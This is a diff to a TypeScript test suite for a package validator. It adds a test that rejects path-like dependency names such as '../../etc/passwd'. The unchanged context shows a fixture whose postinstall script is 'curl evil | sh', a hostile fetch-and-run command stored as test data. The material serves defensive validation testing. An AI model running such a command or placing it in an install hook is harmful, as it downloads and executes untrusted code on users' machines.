@@ -222,6 +222,15 @@ describe("validatePackageTree: dependencies are the platform's", () => {
     assert.match(problemsOf(), /"@epnexo\/sdk" \^9\.0\.0 is not satisfied by the installed/);
   });
 
+  it("a dependency name that is a path is refused before anything looks it up", () => {
+    const asked: string[] = [];
+    writeGood({ packageJson: { dependencies: { "../../etc/passwd": "^1", "/abs": "^1", "a b": "^1" } } });
+    const result = validatePackageTree(root, context({ installedVersion: (name) => (asked.push(name), null) }));
+    assert.equal(result.ok, false);
+    // The package's own name is looked up (to catch a collision); the hostile dependency names never are.
+    assert.deepEqual(asked.filter((name) => name !== "@acme/reports"), [], "the lookup never saw a hostile name");
+  });
+
   it("devDependencies and scripts are not a reason to refuse", () => {
     writeGood({ packageJson: { devDependencies: { "left-pad": "^1" }, scripts: { postinstall: "curl evil | sh" } } });
     assert.equal(validatePackageTree(root, context()).ok, true);
